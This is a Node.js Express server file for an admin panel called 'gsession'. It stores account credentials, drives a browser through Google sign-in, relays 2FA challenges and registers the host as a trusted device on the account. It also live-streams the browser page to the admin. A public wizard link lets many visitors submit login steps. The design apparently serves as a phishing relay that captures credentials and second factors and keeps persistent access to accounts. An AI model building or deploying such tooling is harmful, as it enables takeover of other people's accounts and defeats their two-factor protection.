import express from 'express';
import fs from 'fs';
import crypto from 'crypto';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ENV_PATH = path.join(__dirname, '.env');

// --- generate secrets on first run, then load .env into process.env ---
function ensureEnv() {
  if (!fs.existsSync(ENV_PATH)) {
    const key = crypto.randomBytes(32).toString('hex');
    const token = crypto.randomBytes(24).toString('hex');
    fs.writeFileSync(ENV_PATH, `GSESSION_MASTER_KEY=${key}\nADMIN_TOKEN=${token}\nPORT=${process.env.PORT || 3002}\n`);
    console.log('\n  First run: generated .env with a fresh encryption key and admin token.\n');
  }
}
function loadEnv() {
  for (const line of fs.readFileSync(ENV_PATH, 'utf8').split('\n')) {
    const m = line.match(/^([A-Z0-9_]+)=(.*)$/);
    if (m) process.env[m[1]] = m[2].trim();
  }
}
ensureEnv();
loadEnv();

// A single thrown journey step (locator timeout, flaky page) must never kill
// the whole server — wizard.js polls /step and retries, so a 500 is recoverable.
for (const kind of ['unhandledRejection', 'uncaughtException']) {
  process.on(kind, (err) => console.error(`[gsession] ${kind}:`, err && err.message ? err.message : err));
}

// imported after env is loaded (crypto key read lazily, but be safe)
const store = await import('./lib/store.js');
const browser = await import('./lib/browser.js');
const invites = await import('./lib/invites.js');
const events = await import('./lib/events.js');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// --- auth: bearer token on every /api route except the token check itself ---
const TOKEN = process.env.ADMIN_TOKEN;
function auth(req, res, next) {
  const header = req.get('authorization') || '';
  const token = header.replace(/^Bearer\s+/i, '');
  if (token && token === TOKEN) return next();
  return res.status(401).json({ error: 'Unauthorized' });
}

// lightweight endpoint the panel uses to validate a typed token
app.post('/api/auth', (req, res) => {
  const token = (req.body && req.body.token) || '';
  res.json({ ok: token === TOKEN });
});

app.get('/api/sessions', auth, (req, res) => {
  const items = store.list().map((s) => ({ ...s, open: browser.isOpen(s.id) }));
  res.json(items);
});

app.post('/api/sessions', auth, (req, res) => {
  const s = store.create(req.body || {});
  res.status(201).json(s);
});

app.patch('/api/sessions/:id', auth, (req, res) => {
  const s = store.update(req.params.id, req.body || {});
  if (!s) return res.status(404).json({ error: 'Not found' });
  res.json(s);
});

app.post('/api/sessions/:id/open', auth, async (req, res) => {
  const s = store.getRaw(req.params.id);
  if (!s) return res.status(404).json({ error: 'Not found' });
  try {
    // Open should launch a VISIBLE (headed) browser and, for Google, actually
    // drive the stored credentials so the window comes up signed in. If a
    // challenge (2FA) is pending it stays open on that screen for manual finish.
    let result = { status: 'open', message: 'Browser opened.' };
    if (s.provider === 'google') {
      result = await browser.login(s, { headless: false });
    } else {
      await browser.open(s.id, s.loginUrl || undefined, { headless: false });
    }
    store.update(s.id, { status: result.status, lastOpenedAt: new Date().toISOString() });
    // Signed in? Register this OS as the trusted device (keypass) right away —
    // the response then carries the trust journey state for the panel to mirror.
    if (result.status === 'logged-in' && s.provider === 'google') {
      const cur = store.getRaw(s.id);
      if (!cur?.deviceTrusted) {
        const trust = await browser.startTrust(s.id);
        if (trust.state) result.trustState = trust.state;
        result.trustMessage = trust.message || '';
      }
    }
    res.json({ ok: true, open: true, ...result });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/sessions/:id/login', auth, async (req, res) => {
  const s = store.getRaw(req.params.id);
  if (!s) return res.status(404).json({ error: 'Not found' });
  try {
    const result = await browser.login(s, { headless: false });
    store.update(s.id, { status: result.status, lastOpenedAt: new Date().toISOString() });
    res.json({ ok: true, open: true, ...result });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Register this OS as the account's trusted device (keypass). Returns the
// current trust state; if the journey asks for password/number/2FA the panel
// mirrors it and keeps polling /state until state === 'trusted'.
app.post('/api/sessions/:id/trust', auth, async (req, res) => {
  const s = store.getRaw(req.params.id);
  if (!s) return res.status(404).json({ error: 'Not found' });
  try {
    const result = await browser.startTrust(s.id);
    const cur = store.getRaw(s.id);
    res.json({ ok: true, open: true, ...result, trusted: Boolean(cur?.deviceTrusted) });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/sessions/:id/close', auth, async (req, res) => {
  const closed = await browser.close(req.params.id);
  res.json({ ok: true, closed });
});

app.delete('/api/sessions/:id', auth, async (req, res) => {
  await browser.close(req.params.id);
  const ok = store.remove(req.params.id);
  res.json({ ok });
});

// ---------------- wizard (public, single static link) ----------------
// One link for everyone: /w/<STATIC_TOKEN>. Every visitor gets their own fresh
// session (tracked by a client-generated wid), so many people can register
// through the same link without stepping on each other.
app.get('/w/:token', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'wizard.html'));
});

app.get('/api/wizard/:token', (req, res) => {
  const w = invites.begin(req.params.token, req.query.wid);
  if (!w) return res.status(404).json({ error: 'This link is invalid or has expired.' });
  res.json(w);
});

app.post('/api/wizard/:token/step', async (req, res) => {
  const { step, value } = req.body || {};
  // wid travels in the query string (sent by wizard.js on every request)
  const wid = req.query.wid || (req.body && req.body.wid);
  const w = await invites.step(req.params.token, wid, step, value);
  if (!w) return res.status(404).json({ error: 'This link is invalid or has expired.' });
  res.json(w);
});

app.post('/api/wizard/:token/complete', async (req, res) => {
  const wid = req.query.wid || (req.body && req.body.wid);
  const w = invites.complete(req.params.token, wid);
  if (!w) return res.status(404).json({ error: 'This link is invalid or has expired.' });
  res.json(w);
});
// Live view of a session's real browser page — JPEG frames (CDP screencast)
// streamed as events, so the panel can show the window in-page like a stream.
// EventSource can't send headers, so the admin token comes in as ?token=.
app.get('/api/sessions/:id/stream', (req, res) => {
  if ((req.query.token || '') !== TOKEN) return res.status(401).end();
  if (!browser.isOpen(req.params.id)) return res.status(404).end();
  res.set({
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    Connection: 'keep-alive',
  });
  res.flushHeaders();
  res.write('data: {"type":"start"}\n\n');
  const unframe = browser.onStreamFrame(
    req.params.id,
    (b64) => res.write(`data: ${JSON.stringify({ type: 'frame', frame: b64 })}\n\n`),
    (err) => res.write(`data: ${JSON.stringify({ type: 'error', message: err })}\n\n`),
  );
  const ping = setInterval(() => res.write(': ping\n\n'), 25000);
  req.on('close', () => {
    clearInterval(ping);
    unframe();
  });
});

// Current live login state of an open session (state + "pick the number"
// options), so the panel can surface pending challenges (number/code/phone).
app.get('/api/sessions/:id/state', auth, async (req, res) => {
  if (!browser.isOpen(req.params.id)) return res.json({ open: false, state: null });
  try {
    const st = await browser.loginState(req.params.id);
    res.json({ open: true, state: st.state || null, status: st.status, message: st.message, options: st.options || null });
  } catch (e) {
    res.json({ open: true, state: 'verifying', message: e.message });
  }
});

// EventSource can't send headers, so the admin token comes in as ?token=
app.get('/api/events', (req, res) => {
  if ((req.query.token || '') !== TOKEN) return res.status(401).end();
  res.set({
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    Connection: 'keep-alive',
  });
  res.flushHeaders();
  // replay recent history so a fresh panel isn't empty
  for (const evt of events.recent()) res.write(`data: ${JSON.stringify(evt)}\n\n`);
  const unsub = events.onEvent((evt) => res.write(`data: ${JSON.stringify(evt)}\n\n`));
  const ping = setInterval(() => res.write(': ping\n\n'), 25000);
  req.on('close', () => {
    clearInterval(ping);
    unsub();
  });
});

const PORT = process.env.PORT || 3002;
const server = app.listen(PORT, "0.0.0.0", () => {
  console.log(`\n  gsession admin panel:  http://localhost:${PORT}`);
  console.log(`  Admin token:           ${TOKEN}\n`);
});

// close what we open
async function shutdown() {
  console.log('\n  Shutting down — closing open browser sessions...');
  await browser.closeAll();
  server.close(() => process.exit(0));
  setTimeout(() => process.exit(0), 3000);
}
process.on('SIGINT', shutdown);
process.on('SIGTERM', shutdown);
